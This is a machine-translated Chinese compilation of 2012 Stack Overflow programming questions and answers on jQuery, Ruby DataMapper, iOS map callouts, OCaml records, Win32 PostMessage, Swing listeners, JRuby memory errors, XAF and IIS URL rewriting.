        $(el).html('<input type="text" value="' + $(el).attr('data-orig') + '">');
    });
});    

$('.save').click(function() {
    $('.edit').show();
    $('.save,.cancel').hide();

      $('.editable').each(function(index, el) {
        $(el).attr('data-orig', '');   
        $(el).html($(el).find('input').val());
    });            
});

$('.cancel').click(function() {
    $('.edit').show();
    $('.save,.cancel').hide();

      $('.editable').each(function(index, el) {
        $(el).html($(el).attr('data-orig'));
        $(el).attr('data-orig', '');   
    });            
});​ 
```

# javascript - 用于创建照片拼贴的 jQuery 库

> ID：13280204
> 
> 赞同：8
> 
> 时间：2012-11-07T23:39:51.290
> 
> 标签：javascript, jquery, jquery-ui, user-interface, photo

我正在制作一个照片拼贴应用程序并寻找一个 javascript 库来使我的拼贴看起来像 Path 中的“Life in Landscape”。（它是 5 天前发布的。）这是屏幕截图：![在此处输入图像描述](../Images/487ed42db23ff611d7392e54fc3867d9.png)

我已经知道[Masonry](http://masonry.desandro.com/)、[Isotope](http://isotope.metafizzy.co/)和[jQuery Tiles Gallery](http://codecanyon.net/item/jquery-tiles-gallery/2281417)做了类似的拼贴画。我已经使用 Tiles Gallery ( [www.vash.co/vital.anna](http://vash.co/vital.anna) ) 构建了一个解决方案，但它会任意剪切图像，而 Path 似乎会剪切它们以使面部居中。

此外，我希望视频和文本成为拼贴画的一部分，但上述库都不允许这样做。

如果您可以建议任何这样做的图书馆，将不胜感激。

# ruby - 将 datamapper 运算符附加到 ruby 符号并放入哈希中

> ID：13280220
> 
> 赞同：0
> 
> 时间：2012-11-07T23:41:49.963
> 
> 标签：ruby, datamapper, ruby-datamapper

我有：

```
{xyz => [:abc, :klm, :nop]} 
```

我想动态地拥有这样的东西（22、33、44 是一些随机值）：

```
{:abc.gte => 22, :klm.gte => 33, :nop.gte => 44} 
```

`gte`是一个 Datamapper 运算符，如[http://datamapper.org/docs/find.html中所述](http://datamapper.org/docs/find.html)

有谁知道如何构建第二个哈希？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T00:24:05.157

随机值的最小值/最大值是多少？

假设它是从 1 到 100 的范围。那么您只需这样做：

```
require 'data_mapper'

properties = [:abc, :klm, :nop]
rand_range = (1..100).to_a

hash = properties.inject({}) { |h, p| h.update p.gte => rand_range.sample  }
p hash 
```

你会得到一个哈希值，你可以将它提供给 datamapper 的过滤器：

```
{#<DataMapper::Query::Operator @target=:abc @operator=:gte>=>24, #<DataMapper::Query::Operator @target=:klm @operator=:gte>=>52, #<DataMapper::Query::Operator @target=:nop @operator=:gte>=>51} 
```

## 在此处查看[现场演示](http://cibox.org/slivu/stackoverflow?lang=ruby&file=attaching-datamapper-operator-to-ruby-symbol-and-put-into-hash.rb&run=true)。

# ios - 地图标注 showCallout-iOS

> ID：13280221
> 
> 赞同：4
> 
> 时间：2012-11-07T23:41:54.347
> 
> 标签：ios, ios6, mkmapview, ios6-maps

我无法显示注释标题，如下图所示。第一张图片很好地表示了价值；另一方面，一旦值上升到三位数，则标题显示三个点，如第二张图片所示。我想知道如何解决这个问题。任何想法都会受到欢迎！提前非常感谢，不胜感激！我刚刚把我的代码放在这里供参考！

```
- (MKAnnotationView *)mapView:(MKMapView *)mV viewForAnnotation:(id <MKAnnotation>)annotation {
   MKAnnotationView *pinView=nil;
    if(![annotation isKindOfClass:[Annotation class]]) // Don't mess user location
        return nil;

    static NSString *defaultPinID = @"StandardIdentifier";
    pinView = (MKAnnotationView *)[self.mapView dequeueReusableAnnotationViewWithIdentifier:defaultPinID];
    if (pinView == nil){
        pinView = [[MKAnnotationView alloc] initWithAnnotation:annotation reuseIdentifier:defaultPinID];
    }

    if ([annotation isKindOfClass:[Annotation class]]) {
        Annotation *a = (Annotation *)annotation;

        pinView.image = [ZSPinAnnotation pinAnnotationWithColor:a.color];
        pinView.annotation = a;
        pinView.enabled = YES;
        pinView.centerOffset=CGPointMake(6.5,-16);
        pinView.calloutOffset = CGPointMake(-11,0);

    }

    pinView.canShowCallout = YES;
    UIButton *rightButton = [UIButton buttonWithType:UIButtonTypeDetailDisclosure];
    [rightButton setTitle:annotation.title forState:UIControlStateNormal];
    [pinView setRightCalloutAccessoryView:rightButton];
    pinView.leftCalloutAccessoryView = [[UIView alloc] init];
    pinView.leftCalloutAccessoryView=nil;

    return pinView;
  } 
```

我的 showCallout 标题在以下代码中更新：

```
NSNumber *attr2=[attr valueForKey:@"ozone_level"];
annotation.title=[NSString stringWithFormat:@"Ozone Level:%@",[attr2 stringValue]]; 
```

![在此处输入图像描述](../Images/84360d979141b0776b0e9ddebad4ac1d.png) ![在此处输入图像描述](../Images/96b2b4d205c77a62afea25d90a46fd99.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T17:09:09.243

问题是当标题更改时，标注视图的布局不会重新计算。也许您应该为此提交错误报告。

要强制重新布局，如果标注可见，您可以取消选择并以编程方式选择注释。它不是动画的，但它改变了标注的宽度：

```
NSNumber *attr2=[attr valueForKey:@"ozone_level"];
annotation.title=[NSString stringWithFormat:@"Ozone Level:%@",[attr2 stringValue]];

if ([self.mapView viewForAnnotation:annotation] != nil) {
    NSArray *selectedAnnotations = self.mapView.selectedAnnotations;
    if ((selectedAnnotations != nil) && ([self.mapView.selectedAnnotations indexOfObject:annotation] != NSNotFound)) {
        [self.mapView deselectAnnotation:annotation animated:NO];
        [self.mapView selectAnnotation:annotation animated:NO];
    }
} 
```

您还应该删除此行，因为注释的标题无论如何都用作注释上的文本标签：

```
[rightButton setTitle:annotation.title forState:UIControlStateNormal]; 
```

**更新：**

@detunized 提供的解决方案适用于动画。不过，您可以更好地删除并重新添加按钮视图，而不是创建不需要的 UIView：

```
NSNumber *attr2=[attr valueForKey:@"ozone_level"];
annotation.title=[NSString stringWithFormat:@"Ozone Level:%@",[attr2 stringValue]];

MKAnnotationView *annotationView = [self.mapView viewForAnnotation:annotation];
// The annotation must be visible, otherwise a refresh isn't needed
if (annotationView != nil) {
    NSArray *selectedAnnotations = self.mapView.selectedAnnotations;
    // The annotation must be selected, otherwise a refresh isn't needed
    if ((selectedAnnotations != nil) && ([self.mapView.selectedAnnotations indexOfObject:annotation] != NSNotFound)) {
            // Unset and re-set the right button to force relayout
            UIView *view = annotationView.rightCalloutAccessoryView;
            annotationView.rightCalloutAccessoryView = nil;
            annotationView.rightCalloutAccessoryView = view;
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T00:10:21.103

我不知道这个问题的正确解决方案，但我有一个 hacky 给你。您需要触发视图的重新布局，这可以通过弄乱附件视图来实现。您在这里没有使用左附件视图，因此您可以将其设置为某物并将其设置回`nil`. 像这样：

```
self.pin.title = @"Ozone Level: 100";
self.pin_view.leftCalloutAccessoryView = [[[UIView alloc] init] autorelease];
self.pin_view.leftCalloutAccessoryView = nil; 
```

我试过了，它适用于 iOS 5。无法在 iOS 6 上测试。

如果你经常这样做，那么最好不要一直创建`UIView`，而是重用一些东西。

我在更新时遇到了同样的问题`rightCalloutAccessoryView`。仅当我首先将其设置为`nil`然后立即将其设置为我首先需要的任何内容时才有效。

# ocaml - 可变记录字段和 { x with ... }

> ID：13280224
> 
> 赞同：5
> 
> 时间：2012-11-07T23:42:24.913
> 
> 标签：ocaml, record, semantics, mutable

我一直在阅读`ocaml`文档，但我无法解释如何`{ x with ... }`围绕可变字段工作的部分。[我发现](http://caml.inria.fr/pub/docs/manual-ocaml/expr.html)的最接近的说

> # 6.7 表达式
> 
> ```
> expr := ...
>     ∣ { expr with  field =  expr  { ; field =  expr }  [;] } 
> ```
> 
> ...
> 
> # 记录
> 
> 该表达式`{ expr with field1 = expr1 ; … ; fieldn = exprn }`构建了一个新记录，其中`fields field1 … fieldn`等于`expr1 … exprn`，并且所有其他字段具有与记录中相同的值`expr`。换句话说，它返回记录的**浅表副本**`expr`，除了字段`field1 … fieldn`，它们被初始化为`expr1 … exprn`。

这种“浅拷贝”措辞可以被解释为意味着`mutable`未提及的字段共享存储空间或可以引用嵌套记录。当我测试（使用“OCaml 顶层，版本 4.00.1”）时

```
type t = { mutable x : int; mutable y: int }
let a = {x=42;y=123}
let b = { a with y=124}
let _ = a.x <- 43
let _ = Printf.printf "b.x=%d\n" b.x
;; 
```

我得到的结果表明`b.x`没有别名`a.x`：

```
b.x=42
type t = { mutable x : int; mutable y : int; }
val a : t = {x = 43; y = 123}
val b : t = {x = 42; y = 124} 
```

这让我很高兴，但我想确保

```
{ e with fi=x } 
```

是有效的语法糖，例如

```
(let tmp=e in { f0=tmp.f0; … fi-1=tmp.fi-1; fi=x; fi+1=tmp.fi+1; …; fn=tmp.fn }) 
```

并且该`mutable`字段不能由`ref`实现可以重用而不是分配新的可变存储的支持。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T01:38:46.550

在我所见的任何地方，“浅拷贝”意味着，就像通过赋值一样简单地转移所有组件，即使在所有字段总是可变的语言中，比如 Java。所以在这种情况下`(let tmp=e in { f0=tmp.f0; … fi-1=tmp.fi-1; fi=x; fi+1=tmp.fi+1; …; fn=tmp.fn })`正是它应该的意思。

# c++ - PostMessage() 在 C++ 中模拟输入？

> ID：13280228
> 
> 赞同：4
> 
> 时间：2012-11-07T23:42:38.760
> 
> 标签：c++, sendmessage, sendkeys, postmessage, sendinput

我正在尝试为游戏制作一个简单的机器人程序。即使游戏失焦或最小化，我也希望它能够正常工作。因此，我不能使用 SendInput() 因为它模拟全局事件。我发现，要完成这项工作，我必须使用 PostMessage() 函数。我做了一个模拟记事本输入的测试程序：

```
#include <Windows.h>
HWND handle = FindWindow(NULL,CStringW("Untitled - Notepad"));
HWND edit = FindWindowEx(handle, NULL, CStringW("Edit"), NULL);
PostMessage(edit, WM_CHAR, 'a', 0 ); 
```

即使记事本失焦或最小化，此示例也成功模拟了在记事本中单击“a”。我同样让鼠标事件也能正常工作。

但是，当我为我的游戏尝试同样的事情时，我无法发布点击命令。查了一下发现调用FindWindowEx()时获取了原来的句柄但是权限被拒绝，没有返回句柄。

如果阻止此功能，是否有办法获得对另一个进程的“编辑”访问权限？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T00:00:51.247

当然 Windows 绝不会让你这样做，如果你试图窃取用户的密码怎么办？没有焦点时不允许接收输入！

但是你可以在这里做一些技巧：你应该为鼠标或键盘编写一个钩子函数，这个函数应该在 DLL（不是你的 EXE）中实现，使用[SetWindowsHookEx](http://msdn.microsoft.com/en-us/library/ms644990%28VS.85%29.aspx)安装它，然后在你的 DLL 中使用 IPC 机制来发送鼠标和/或键盘消息到您的主 EXE。

但除此之外：虽然它通常可以正常工作

```
HWND handle = FindWindow(NULL,CStringW("Untitled - Notepad")); 
```

敌人没有任何意义，windows 必须对大多数函数进行版本化，这些函数至少获得一个字符串参数：一个用于 ANSI，其名称以 . 结尾，`A`另一个用于以`W`. MSVC 在此设计之上有一个额外的层，称为并通过使用定义将所有此类函数映射到 ANSI 或 Wide，因此如果您使用该版本的 API，直接使用生成宽字符串`TCHAR`是不明智的。`CStringW`并且由于 Windows API 使用`char*`以及`wchar_t*`为什么将字符串文字转换为`CString`然后将其传递给函数？你应该使用其中之一：

```
// This also work with CStringA
HWND handleA = FindWindowA(NULL, "Untitled - Notepad");
// This also work with CStringW
HWND handleW = FindWindowW(NULL, L"Untitled - Notepad");
// This also work with CString
HWND handleT = FindWindow(NULL, _T("Untitled - Notepad") ); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-06-27T08:10:31.793

您确定您尝试向其发送文本的游戏拥有一个可以从客户端的子项中枚举的 Windows 编辑控件吗？您所指的编辑控件很可能是客户端图形容器的一个实体。如果是这种情况，您可能必须向客户端窗口本身发送`WM_KEYDOWN`消息`WM_KEYUP`才能实现所需的功能。

希望有帮助。

# java - 如何实时获取 jTextField 的值？

> ID：13280231
> 
> 赞同：2
> 
> 时间：2012-11-07T23:42:53.667
> 
> 标签：java, swing, actionlistener, jtextfield, documentlistener

我在为 jtextfield 设置 actionlistener 时遇到问题。我想根据用户在 jtextfield 中的输入实时更新字符串。到目前为止，我已经向 jtextfield 添加了 actionlistener，它允许我在 jtextfield 中按 enter 后更新我的。

我只是想知道无论如何我可以实时做到吗？

也感谢 Hovercraft Full Of Eels 的建议，我点这件事工作。如果有人再次偶然发现这个问题，以下是我使用的代码

```
jtextfieldName.getDocument().addDocumentListener(new DocumentListener() {

        @Override
        public void removeUpdate(DocumentEvent arg0) {
            // TODO put what you would like to do when text is deleted

        }

        @Override
        public void insertUpdate(DocumentEvent arg0) {
            // TODO put what you would like to do when text is added
        }

        @Override
        public void changedUpdate(DocumentEvent arg0) {
            // TODO Auto-generated method stub

        }
    }); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-07T23:44:22.410

一种可能性是将 DocumentListener 添加到 JTextField 的 PlainDocument。如果要过滤信息以防止输入某种类型的文本，请考虑改用 DocumentFilter。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-07T23:47:34.877

您想使用 a[`DocumentListener`](http://docs.oracle.com/javase/7/docs/api/javax/swing/event/DocumentListener.html)或者，如果您想更改/过滤用户输入的内容，a[`DocumentFilter`](http://docs.oracle.com/javase/7/docs/api/javax/swing/text/DocumentFilter.html)

SO上有几十个例子，但你也可以查看[MDP的博客](http://www.jroller.com/dpmihai/entry/documentfilter)以获取其他一些例子

# javascript - 修改 jQuery 扩展以在对象内推送数组项但扩展其他对象

> ID：13280232
> 
> 赞同：7
> 
> 时间：2012-11-07T23:43:07.427
> 
> 标签：javascript, jquery, extend

我认为这一定是一个常见问题，但似乎无法找到解决方案。使用 JSON 配置文件来扩展包含对象和数组的 jQuery 对象。

对于对象和简单属性，我想覆盖（`extend`很好）。

对于数组，可能存在也可能不存在现有项目。

目前一个数组只是覆盖了第一个元素

```
var sourceObj = {propterty:"change Me",anArray:[{name:"first"},{name:"second"}]},
    configJSON = '{"propterty":"New Val","anArray":[{"name":"third"}]}',
    configObj = JSON.parse(configJSON);

$.extend(true,sourceObj,configObj); 
```

[http://jsfiddle.net/PmuwV/](http://jsfiddle.net/PmuwV/)

这将返回：

```
{propterty:"New Val" , anArray:[{name:"third"},{name:"second"}} 
```

我可以得到：

```
{propterty:"New Val",anArray:[{name:"first"},{name:"second"},{name:"third"}]} 
```

同时还允许更新“第一”和“第二”对象？

```
"anArray":[{"name":"second","newProp":"add newProp to second"}] 
```

是否可以/应该`extend`修改以比较数组项并根据某些规则或设置属性值（例如“名称”）扩展或添加？

感谢您的任何建议或指示。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T04:02:12.027

我使用了这个解决方案[http://jsfiddle.net/PmuwV/2/](http://jsfiddle.net/PmuwV/2/) 修改自[如何动态合并两个 JavaScript 对象的属性？](https://stackoverflow.com/questions/171251/how-can-i-merge-properties-of-two-javascript-objects-dynamically)也来自[jQuery 的扩展方法的 JavaScript 等价物](https://stackoverflow.com/questions/11197247/javascript-equivalent-of-jquerys-extend-method?rq=1)

需要 isDOMNode() 我刚刚在数组中添加了一个 jquery 合并（是的，我也觉得很脏），其中重复项需要在合并后清理。扩展的 Jquery 源代码做了一些非常相似的事情，但我发现这更具可读性。

```
function mergeRecursive() {
  // _mergeRecursive does the actual job with two arguments.
  var _mergeRecursive = function (dst, src) {
    if ( isDOMNode(src) || typeof src!=='object' || src===null) {
      return dst; 
    }

    for ( var p in src ) {

//my added bit here - [SB]
      if ($.isArray(src[p])){
          $.merge(dst[p],src[p]);
          var dupes = {},
               singles = [];
          $.each(  dst[p], function(i, el) {
             if ((dupes[el.name] > -1) &&  (el.name)) {
                 $.extend(singles[dupes[el.name]],el);
             }else{
                  if (el.name ){
                     dupes[el.name] = i;
                  }
                 singles.push(el);
             }
         });
         dst[p] = singles;
         }
         continue;        
      }
//the rest is original - [SB]

      if( !src.hasOwnProperty(p) ) continue;
      if ( src[p]===undefined ) continue;
      if ( typeof src[p]!=='object' || src[p]===null) {
        dst[p] = src[p];
      } else if ( typeof dst[p]!=='object' || dst[p]===null ) {
        dst[p] = _mergeRecursive(src[p].constructor===Array ? [] : {}, src[p]); 
      } else {              
        _mergeRecursive(dst[p], src[p]);
      }
    }
    return dst;
  }

  // Loop through arguments and merge them into the first argument. 
  var out = arguments[0];
  if ( typeof out!=='object' || out===null) return out;
  for ( var i=1, il=arguments.length; i<il; i++ ) {
    _mergeRecursive(out, arguments[i]);
  }
  return out;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-08-21T13:06:51.723

[使用lodash 库](https://lodash.com/docs#merge)非常简单

```
var targetObj = {
    customerId: "123", 
    orders: [
        "item1", "item2"
    ]
};

var otherObj = {
    customerName: "John", 
    orders: [
        "item3", "item4"
    ]
};

_.merge(targetObj, otherObj, function (a, b) {
  if (_.isArray(a)) {
    return a.concat(b);
  }
}); 
```

结果是：

```
targetObj = {
    customerId: "123",
    customerName: "John",
    orders: [
        "item1", "item2", "item3", "item4"
    ]       
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-01-29T07:56:52.373

```
<html>
<head>
<script type="text/javascript" src="./jquery-2.1.3.js"></script> <!-- for json extend / merge -->
<script type="text/javascript" src="./jQuery.extendext.min.js"></script> <!-- for json extend / merge - with array extend (instead of array overwrite) - https://github.com/mistic100/jQuery.extendext -->

<script>
var jsonResult = {};
var json1 =
{
    "properties":
    {
        "street_address": { "type": "string" },
        "city": { "type": "string" },
        "state": { "type": "string" }
    },
    "required": ["street_address", "city", "state"]
};
var json2 =
{
    "properties":
    {
        "country": { "type": "string" },
        "country-dial-code": { "type": "integer" },
        "country-short": { "type": "string" }
    },
    "required": ["country", "country-dial-code", "country-short"]
};
$.extendext(true, 'extend', jsonResult, json1, json2);
console.log(JSON.stringify(jsonResult));
/* output ->
{   "properties":
    {   "street_address":{"type":"string"},
        "city":{"type":"string"},
        "state":{"type":"string"},
        "country":{"type":"string"},
        "country-dial-code":{"type":"integer"},
        "country-short":{"type":"string"}
    },
    "required":["street_address","city","state","country","country-dial-code","country-short"]
}
*/
</script>
</head>
<body>
</body>
</html> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-10-07T18:20:08.607

我知道这很旧，但我找到了这篇文章并使用了上面的史蒂夫布莱克斯代码，但发现了一些错误：

1.  isArray 部分的“继续”之前有一个额外的“}”。
2.  如果源根本没有数组，它会抛出一个错误，所以我将它添加到 isArray 部分

    ```
    if ( !dst[p] ) {
        dst[p] = src[p];
        continue;
    } 
    ```

所以完成的代码如下所示：

```
function isDOMNode(v) {
    if ( v===null ) return false;
    if ( typeof v!=='object' ) return false;
    if ( !('nodeName' in v) ) return false; 
    var nn = v.nodeName;
    try {
      v.nodeName = 'is readonly?';
    } catch (e) {
      return true;
    }
    if ( v.nodeName===nn ) return true;
    v.nodeName = nn;
    return false;
}

function mergeRecursive() {
    // _mergeRecursive does the actual job with two arguments.
    var _mergeRecursive = function (dst, src) {
        if ( isDOMNode(src) || typeof src!=='object' || src===null) {
            return dst; 
        }

        for ( var p in src ) {
            if ($.isArray(src[p])) {
                if ( !dst[p] ) {
                    dst[p] = src[p];
                    continue;
                }
                $.merge(dst[p],src[p]);
                var dupes = {}, singles = [];
                $.each( dst[p], function(i, el) {
                    if ((dupes[el.name] > -1) &&  (el.name)) {
                        $.extend(singles[dupes[el.name]],el);
                    } else {
                        if (el.name) {
                            dupes[el.name] = i;
                        }
                     singles.push(el);
                   }
                });
                dst[p] = singles;
                continue;        
            }

            if ( !src.hasOwnProperty(p) ) continue;
            if ( src[p]===undefined )     continue;
            if ( typeof src[p]!=='object' || src[p]===null) {
                dst[p] = src[p];
            } else if ( typeof dst[p]!=='object' || dst[p]===null ) {
                dst[p] = _mergeRecursive(src[p].constructor===Array ? [] : {}, src[p]); 
            } else {              
                _mergeRecursive(dst[p], src[p]);
            }
        }
        return dst;
    }

    // Loop through arguments and merge them into the first argument. 
    var out = arguments[0];
    if ( typeof out!=='object' || out===null) return out;
    for ( var i=1, il=arguments.length; i<il; i++ ) {
      _mergeRecursive(out, arguments[i]);
    }
    return out;
} 
```

# ruby - 在 Rails 中运行单元和功能测试时，JRuby 垃圾收集抛出错误

> ID：13280233
> 
> 赞同：2
> 
> 时间：2012-11-07T23:43:20.560
> 
> 标签：ruby, unit-testing, garbage-collection, jruby

我在 Rails 应用程序（3.2.8）的测试中遇到了 JRuby 和垃圾收集的问题。当我运行我的单元测试时，我很好，但是当我同时运行单元和功能或只是功能时，它往往会出现如下奇怪的堆栈跟踪。

我不知道发生了什么。这只是在我升级 Rails 并将 JRuby 从 1.6.3 升级到 1.6.7.2 时才开始发生的。

```
 /home/mbridges/.rbenv/versions/jruby-1.6.7.2/bin/jruby -I"lib:test" -I"/home/mbridges/.rbenv/versions/jruby-1.6.7.2/lib/ruby/gems/1.8/gems/rake-0.9.2.2/lib" "/home/mbridges/.rbenv/versions/jruby-1.6.7.2/lib/ruby/gems/1.8/gems/rake-0.9.2.2/lib/rake/rake_test_loader.rb" "test/unit/**/*_test.rb"
   * WARNING: 'test: #channel_id should return the correct channel id. ' is already defined
 Loaded suite /home/mbridges/.rbenv/versions/jruby-1.6.7.2/lib/ruby/gems/1.8/gems/rake-0.9.2.2/lib/rake/rake_test_loader
 Started
 ...............................................................................
 ...............................................................................
 ...............................................................................
 ...............................................................................
 ...............................................................................
 ...............................................................................
 ...........................................................

 Finished in 156.993 seconds.

 533 tests, 1030 assertions, 0 failures, 0 errors, 0 pendings, 0 omissions, 0 notifications
 0% passed

 3.40 tests/s, 6.56 assertions/s
 /home/mbridges/.rbenv/versions/jruby-1.6.7.2/bin/jruby -I"lib:test" -I"/home/mbridges/.rbenv/versions/jruby-1.6.7.2/lib/ruby/gems/1.8/gems/rake-0.9.2.2/lib" "/home/mbridges/.rbenv/versions/jruby-1.6.7.2/lib/ruby/gems/1.8/gems/rake-0.9.2.2/lib/rake/rake_test_loader.rb" "test/functional/**/*_test.rb"
 LoadError: No such file to load -- java.lang.OutOfMemoryError: GC overhead limit exceeded
            depend_on at /home/mbridges/.rbenv/versions/jruby-1.6.7.2/lib/ruby/gems/1.8/gems/activesupport-3.2.8/lib/active_support/dependencies.rb:317
            depend_on at /home/mbridges/.rbenv/versions/jruby-1.6.7.2/lib/ruby/gems/1.8/gems/activesupport-3.2.8/lib/active_support/dependencies.rb:313
   require_dependency at /home/mbridges/.rbenv/versions/jruby-1.6.7.2/lib/ruby/gems/1.8/gems/activesupport-3.2.8/lib/active_support/dependencies.rb:225
          eager_load! at /home/mbridges/.rbenv/versions/jruby-1.6.7.2/lib/ruby/gems/1.8/gems/railties-3.2.8/lib/rails/engine.rb:439
                 each at org/jruby/RubyArray.java:1615
          eager_load! at /home/mbridges/.rbenv/versions/jruby-1.6.7.2/lib/ruby/gems/1.8/gems/railties-3.2.8/lib/rails/engine.rb:438
                 each at org/jruby/RubyArray.java:1615
          eager_load! at /home/mbridges/.rbenv/versions/jruby-1.6.7.2/lib/ruby/gems/1.8/gems/railties-3.2.8/lib/rails/engine.rb:436
             Finisher at /home/mbridges/.rbenv/versions/jruby-1.6.7.2/lib/ruby/gems/1.8/gems/railties-3.2.8/lib/rails/application/finisher.rb:53
        instance_exec at org/jruby/RubyBasicObject.java:1757
                  run at /home/mbridges/.rbenv/versions/jruby-1.6.7.2/lib/ruby/gems/1.8/gems/railties-3.2.8/lib/rails/initializable.rb:30
     run_initializers at /home/mbridges/.rbenv/versions/jruby-1.6.7.2/lib/ruby/gems/1.8/gems/railties-3.2.8/lib/rails/initializable.rb:55
                 each at org/jruby/RubyArray.java:1615
     run_initializers at /home/mbridges/.rbenv/versions/jruby-1.6.7.2/lib/ruby/gems/1.8/gems/railties-3.2.8/lib/rails/initializable.rb:54
          initialize! at /home/mbridges/.rbenv/versions/jruby-1.6.7.2/lib/ruby/gems/1.8/gems/railties-3.2.8/lib/rails/application.rb:136
             __send__ at org/jruby/RubyBasicObject.java:1698
                 send at org/jruby/RubyKernel.java:2097
       method_missing at /home/mbridges/.rbenv/versions/jruby-1.6.7.2/lib/ruby/gems/1.8/gems/railties-3.2.8/lib/rails/railtie/configurable.rb:30
               (root) at /home/mbridges/admin_tools/mbridges_dev/customer_service_tool/config/environment.rb:12
              require at org/jruby/RubyKernel.java:1042
               (root) at /home/mbridges/admin_tools/mbridges_dev/customer_service_tool/config/environment.rb:2
              require at org/jruby/RubyKernel.java:1042
               (root) at /home/mbridges/admin_tools/mbridges_dev/customer_service_tool/test/test_helper.rb:1
              require at org/jruby/RubyKernel.java:1042
             __file__ at /home/mbridges/.rbenv/versions/jruby-1.6.7.2/lib/ruby/gems/1.8/gems/rake-0.9.2.2/lib/rake/rake_test_loader.rb:10
                 each at org/jruby/RubyArray.java:1615
             __file__ at /home/mbridges/.rbenv/versions/jruby-1.6.7.2/lib/ruby/gems/1.8/gems/rake-0.9.2.2/lib/rake/rake_test_loader.rb:9
               select at org/jruby/RubyArray.java:2395
               (root) at /home/mbridges/.rbenv/versions/jruby-1.6.7.2/lib/ruby/gems/1.8/gems/rake-0.9.2.2/lib/rake/rake_test_loader.rb:4
 rake aborted!
 Command failed with status (1): [/home/mbridges/.rbenv/versions/jruby-1.6.7...]

 Tasks: TOP => without_schema_dump:functionals
 (See full trace by running task with --trace) 
```

Rakefile 有点不同，因为我们实际上并不控制数据库。我们必须跳过迁移。

# 在 lib/tasks 中以 .rake 结尾的文件中添加您自己的任务，# 例如 lib/tasks/capistrano.rake，它们将自动可供 Rake 使用。

```
require File.expand_path('../config/application', __FILE__)
require 'rake'

CustomerService::Application.load_tasks

namespace :without_schema_dump do
  Rake::TestTask.new(:units) do |t|
    t.libs << "test"
    t.pattern = 'test/unit/**/*_test.rb'
    t.verbose = true
  end
  Rake::TestTask.new(:functionals) do |t|
    t.libs << "test"
    t.pattern = 'test/functional/**/*_test.rb'
    t.verbose = true
  end
  task :run_tests => :environment do
    Rake::Task['without_schema_dump:units'].invoke
    Rake::Task['without_schema_dump:functionals'].invoke
  end
end

Rake::Task[:default].prerequisites.clear
Rake::Task[:default].actions.clear
task :default do
  puts 'WARNING: Default rake overwritten because of foreign key constraints (see Rakefile)'
  Rake::Task['without_schema_dump:run_tests'].invoke
end 
```

帮助？任何帮助，将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T07:35:25.897

很可能较新的 JRuby 正在做更多的工作并达到 GC 限制：

GC 检查在回收太“少”内存时是否花费太多时间进行 GC ......增加堆大小应该可以解决这个问题尝试：`export JRUBY_OPTS="--client -J-Xmx=640m"`

它也可能是一个回归“错误”，但我认为不会有另一个**1.6.x**版本。如果问题仍然存在并且在**1.7.0中发生，您可以尝试****1.6.8**中的一些反向移植

 **[http://www.oracle.com/technetwork/java/javase/gc-tuning-6-140523.html#par_gc.oom](http://www.oracle.com/technetwork/java/javase/gc-tuning-6-140523.html#par_gc.oom)**

# devexpress - 获取在 Xaf 的 Updater 中创建的对象

> ID：13280238
> 
> 赞同：0
> 
> 时间：2012-11-07T23:44:03.450
> 
> 标签：devexpress, xaf

我正在使用 XAF，我有一个`ApplicationSettings`类，我在 Updater.cs 中创建了这个类的一个对象：

```
ApplicationSettings settings = ObjectSpace.FindObject<ApplicationSettings>(
    new BinaryOperator("Name", "DefaultSettings"));
if (settings == null) {
    settings = ObjectSpace.CreateObject<ApplicationSettings>();
    settings.Name = "DefaultSettings";
    // some code 
} 
```

我想从另一个类中获取这个对象，我该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T08:20:28.610

我相信您的 ApplicationSettings 类应该是一个单例。这样，您可以轻松地从应用程序的任何部分访问它。有关如何实现此功能的更多详细信息，[请参阅 XAF 文档中的示例。](http://documentation.devexpress.com/#Xaf/CustomDocument2916)如果由于某种原因无法使用此选项，您始终可以使用 ObjectSpace 或 Session 类的 FindObject 方法访问您的对象（正如您在上面已经写过的）：

ApplicationSettings settings = ObjectSpace.FindObject(new BinaryOperator("Name", "DefaultSettings"));

# url - 网址重写通过测试但不重定向

> ID：13280243
> 
> 赞同：0
> 
> 时间：2012-11-07T23:44:38.297
> 
> 标签：url, url-rewriting

我在我的 iis 中安装了一个 URL 重写模块 2，我有这个规则

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <rewrite>
            <rules>
                <rule name="ASPX to ASP Redirect" stopProcessing="true">
                    <match url="([_0-9a-z-\.]+).com/([_0-9a-z-]+).aspx$" />
                    <action type="Redirect" url="http://{R:1}.com/{R:2}.asp" appendQueryString="true" logRewrittenUrl="false" redirectType="Permanent" />
                </rule>
            </rules>
        </rewrite>
    </system.webServer>
</configuration> 
```

基本上我想要的是创建匹配的东西，如 www.test.com/default.aspx 并将其重定向到它的 asp 版本，所以当我输入 www.test.com/default.aspx 时，它将重定向到 www.test.com/默认.asp。

不知道这有什么问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-10T15:40:33.503

域名不是与您的正则表达式匹配的 URL 的一部分。域名是什么真的很重要吗？我想说，只要 URL 以它结尾，`.aspx`就应该重定向到以`.asp`. 这很容易做到：

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <rewrite>
            <rules>
                <rule name="ASPX to ASP Redirect" stopProcessing="true">
                    <match url="(.*)\.aspx$" />
                    <action type="Redirect" url="/{R:1}.asp" appendQueryString="true" redirectType="Permanent" />
                </rule>
            </rules>
        </rewrite>
    </system.webServer>
</configuration> 
```

# hadoop - hadoop-0.23.4 namenode 启动失败

> ID：13280246
> 
> 赞同：1
> 
> 时间：2012-11-07T23:44:50.530
> 
> 标签：hadoop, mapreduce, hdfs, hadoop-yarn

